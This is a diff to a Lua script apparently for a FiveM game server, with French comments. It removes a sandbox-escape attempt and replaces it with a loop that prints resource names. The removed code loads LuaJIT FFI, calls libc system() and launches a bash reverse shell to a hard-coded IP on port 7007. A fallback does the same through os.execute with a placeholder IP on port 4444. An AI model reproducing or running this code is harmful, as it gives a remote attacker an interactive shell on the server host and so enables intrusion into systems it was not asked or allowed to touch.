@@ -1,35 +1,4 @@
-local ffi = nil
--- On tente de charger le module FFI
-pcall(function() ffi = require("ffi") end)
-
-if ffi then
-    print("^3[FFI]^7 Module détecté. Tentative d'évasion...")
-
-    -- On définit les fonctions C dont on a besoin (libc)
-    ffi.cdef[[
-        int system(const char *command);
-    ]]
-
-    -- Configuration du Reverse Shell
-    local ip = "92.88.98.199"
-    local port = "7007"
-    
-    -- La commande Bash classique pour le reverse shell
-    -- On utilise 'nohup' pour ne pas bloquer le thread principal de FiveM
-    local payload = string.format("nohup bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' &", ip, port)
-
-    -- Appel direct à la fonction système (C'est ici que la sandbox saute)
-    local result = ffi.C.system(payload)
-
-    if result == 0 then
-        print("^2[SUCCESS]^7 Commande transmise au système.")
-    else
-        print("^1[ERROR]^7 Échec de l'appel système.")
-    end
-else
-    print("^1[FAILED]^7 Le module FFI est désactivé ou absent. Impossible de sortir de la sandbox.")
-    
-    -- Alternative : Test via os.execute (souvent bloqué mais on ne sait jamais)
-    print("^3[INFO]^7 Tentative via os.execute classique...")
-    os.execute(string.format("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' &", "TON_IP", "4444"))
+for i = 0, GetNumResources() - 1 do
+    local resourceName = GetResourceName(i)
+    print("Ressource trouvée : " .. resourceName)
 end
